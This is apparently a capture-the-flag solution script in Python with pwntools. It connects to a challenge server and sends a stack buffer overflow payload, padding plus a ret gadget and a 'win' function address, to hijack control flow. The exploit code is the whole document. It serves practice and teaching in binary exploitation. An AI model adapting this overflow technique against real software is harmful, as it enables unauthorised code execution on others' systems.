#!/usr/bin/env python3 
from pwn import *

r = process("./chall")
r = remote("pwn.chall.pwnoh.io", 13386)
e = ELF("./chall")

# call submit_code 29 times
for i in range(0, 29):
    r.sendlineafter(b"2. Get fired\n", b"1")
    r.sendlineafter(b"length.\n", b"AAAA")
    #r.interactive()

pause()
r.sendlineafter(b"2. Get fired\n", b"1")

ret = ROP(e).find_gadget(["ret"]).address
payload = b"A"*520 + b"\x00" * 8 + b"C" * 8 + p64(ret) + p64(e.symbols['win'])
r.sendlineafter(b"length.\n", payload)

r.interactive()